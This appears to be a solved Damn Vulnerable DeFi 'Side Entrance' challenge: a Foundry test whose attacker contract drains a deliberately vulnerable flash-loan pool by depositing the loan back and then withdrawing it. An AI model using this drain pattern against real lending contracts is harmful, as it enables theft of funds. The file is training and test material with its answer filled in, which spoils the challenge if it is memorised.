// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        /*  The contract SideEntranceLenderPool has a vulnerability that allows an attacker to drain the pool of ETH.
            when performing the flash loan it executes the execute() function of the IFlashLoanEtherReceiver interface.
            The attacker can call the flashLoan() function with a smart contract that implements the IFlashLoanEtherReceiver interface.
            The vulnerability resides that if the attacker contract calls deposit() function of the SideEntranceLenderPool contract
            the balance of the attacker contract will be increased by the amount of ETH deposited while maintaining the balance of the pool.
            The attacker can then withdraw the ETH from the pool by calling the withdraw() function of the SideEntranceLenderPool contract.
        */
        AttackSideEntrance attacker = new AttackSideEntrance(pool, recovery);
        attacker.attack();

    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}

contract AttackSideEntrance{
    SideEntranceLenderPool pool;
    address recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        recovery.call{value: address(this).balance}("");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
    // the contract need to have either a receive() or a fallback() function to receive the ETH
    receive() external payable {}
}
